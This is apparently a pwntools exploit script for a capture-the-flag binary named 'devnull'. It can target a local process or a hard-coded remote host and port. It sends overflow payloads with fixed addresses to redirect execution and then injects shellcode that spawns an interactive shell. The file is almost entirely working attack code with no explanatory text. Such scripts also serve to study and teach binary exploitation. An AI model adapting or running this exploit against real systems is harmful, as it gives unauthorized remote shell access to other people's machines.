# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './devnull'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = '182.92.161.17'
    port = '19099'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def attack():

    
    payload  = 'a'*0x20
    sa('filename\n' , payload)
    
    payload = 'a'*0x14 + p64(0x3fe000+0xd8+8) + p64(0x3fe000+0xd8) + p64(0x401350)
    sa('discard\n' , payload)

    payload = p64(0x4012D0)+p64(0)+p64(0x3fe000 + 0xe8 + 0x10)+asm(shellcraft.sh())
    sa('data\n' , payload)
    
    p.interactive()

attack()

'''
@File    :   devnull.py
@Time    :   2022/07/30 14:30:08
@Author  :   Niyah 
'''